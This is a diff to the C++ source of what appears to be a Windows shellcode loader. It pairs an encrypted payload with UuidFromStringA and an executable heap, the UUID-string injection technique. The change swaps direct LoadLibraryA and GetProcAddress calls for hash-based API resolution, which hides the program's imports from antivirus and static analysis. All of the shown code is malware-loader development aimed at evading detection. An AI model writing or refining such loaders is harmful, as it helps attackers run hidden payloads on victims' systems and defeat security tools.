@@ -11,37 +11,47 @@
 #include "filters.h"
 #include "modes.h"
 
+#include "GetProcAddressWithHash.h"
 #include "CryptPayload.h"
 
 #pragma comment(lib, "cryptlib")
 
-typedef RPC_STATUS(__stdcall* UA)(RPC_CSTR, UUID*);
-
+typedef RPC_STATUS(WINAPI* UA)(RPC_CSTR, UUID*);
 UA fUuidFromStringA;
 
+typedef HMODULE(WINAPI* LL)(LPCSTR);
+LL fLoadLibraryA;
+
 int main()
-{	
-    HMODULE rpcrt4Dll = LoadLibraryA("Rpcrt4.dll");
+{
+    fLoadLibraryA = (LL)GetProcAddressWithHash(0x0726774C);
+	if (!fLoadLibraryA)
+	{
+#ifdef _DEBUG
+        printf("[-] Unable to get proc address: LoadLibraryA\n");
+#endif		
+	}
+	
+    HMODULE rpcrt4Dll = fLoadLibraryA("Rpcrt4.dll");
     if (rpcrt4Dll)
     {
-        fUuidFromStringA = (UA)GetProcAddress(rpcrt4Dll, "UuidFromStringA");
+        fUuidFromStringA = (UA)GetProcAddressWithHash(0xA483218A);
         if (!fUuidFromStringA)
         {
 #ifdef _DEBUG
             printf("[-] Unable to get proc address: UuidFromStringA\n");
 #endif
         	return -1;
-        }            
+        }  
     }
-    else
-    {
+	else
+	{
 #ifdef _DEBUG
         printf("[-] Unable to load library: Rpcrt4.dll\n");
 #endif
         return -1;
-    }
-        
-
+	}
+   
 	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
     void* ha = nullptr;
 	if (hc)
